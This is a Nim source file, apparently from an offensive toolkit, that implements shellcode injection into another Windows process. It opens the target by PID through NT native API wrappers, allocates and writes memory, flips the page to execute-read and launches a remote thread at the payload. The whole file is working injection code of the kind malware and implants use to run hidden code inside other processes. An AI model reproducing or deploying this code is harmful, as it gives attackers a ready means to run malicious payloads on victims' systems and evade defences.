import ../rth
import ../utils/utils
import ../utils/winapi_wrapper
import winim/lean
import strformat

proc inject*(payload: Payload, pid: DWORD): bool =

  var handle: HANDLE
  var clientId: CLIENT_ID
  var attributes: OBJECT_ATTRIBUTES
  var status: NTSTATUS
  var baseAddr: PVOID           # holds the address of the remotely allocated buffer
  var zeroBits: ULONG_PTR
  var payloadSize: SIZE_T = len(payload.bytes)
  var hThread: HANDLE
  client_id.UniqueProcess = pid


  # Open the remote process with NtOpenProcess()
  DBG("[*] Opening Remote Process")

  status = wNtOpenProcess(addr handle, PROCESS_ALL_ACCESS, addr attributes, addr client_id)

  if status == 0:
    DBG(fmt"[+] NtOpenProcess() succesfull [Handle: {handle}]")
  else:
    DBG("[-] NtOpenProcess() failed")
    return false



  DBG(fmt"[*] Allocating {payload.bytes.len:#X} bytes in the remote process")

  status = wNtAllocateVirtualMemory(
    handle,
    addr baseAddr,
    zeroBits,
    addr payloadSize,
    MEM_COMMIT.or(MEM_RESERVE),
    PAGE_READWRITE
  )

  if status == 0:
    DBG("[+] NtAllocateVirtualMemory() succesfull")
  else:
    DBG("[-] NtAllocateVirtualMemory() failed")
    return false


  var bytesWritten: ULONG

  status = wNtWriteVirtualMemory(
    handle,
    baseAddr,
    unsafeAddr payload.bytes[0],
    cast[ULONG](len(payload.bytes)),
    addr bytesWritten)


  if status == 0:
    DBG("[+] WriteProcessMemory")
    DBG(fmt"    \\-- bytes written: {bytesWritten}")
    DBG("")
  else:
    DBG("[-] NtWriteVirtualMemory() failed")
    return false

  # Change the access rights to EXECUTE_READ
  var oldAccessProtection: ULONG

  status = wNtProtectVirtualMemory(
    handle,
    addr baseAddr,
    addr payloadSize,
    PAGE_EXECUTE_READ,
    addr oldAccessProtection
    )

  if status == 0:
    DBG("[+] Switched access rights to PAGE_EXECUTE_READ")
  else:
    DBG("[-] NtProtectVirtualMemory() failed")
    return false

  DBG("[+] Shellcode injected, executing remote thread")


  status = wNtCreateThreadEx(
    addr hThread,
    MAXIMUM_ALLOWED,
    cast[LPVOID](0),
    handle,
    cast[LPTHREAD_START_ROUTINE](baseAddr),
    cast[LPVOID](0),
    false,
    0, 0, 0, cast[LPVOID](0)
  )

  if status == 0:
    DBG("[+] NtCreateThreadEx() succesfull")
  else:
    DBG("[-] NtCreateThreadEx() failed")
    return false

  # should be injected fine
  return true

